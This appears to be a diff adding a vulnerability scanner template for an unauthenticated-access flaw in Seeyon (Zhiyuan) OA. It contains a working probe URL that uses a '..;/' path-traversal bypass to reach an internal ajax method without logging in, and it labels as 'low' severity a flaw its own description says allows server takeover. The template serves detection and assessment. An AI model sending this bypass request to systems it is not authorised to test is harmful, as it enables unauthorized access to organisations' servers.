@@ -1,0 +1,36 @@
+id: zhiyuan-oa-unauthorized
+info:
+  name: Zhiyuan Oa Unauthorized
+  author:
+  - pikpikcu
+  tags:
+  - seeyon
+  - unauth
+  - zhiyuan
+  description: |-
+    Seeyon OA Unauthorized Access Vulnerability
+    Due to unauthorized access to certain interfaces in older Seeyon OA versions and insufficient filtering in some functions, attackers can craft malicious requests to upload malicious script files without logging in, thereby taking control of the server.
+  reference:
+  - https://buaq.net/go-53721.html
+  severity: low
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website. Seeyon has released a patch for this vulnerability.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - serverIdentifier
+    - companyName
+  - type: word
+    part: header
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile'
+  method: GET
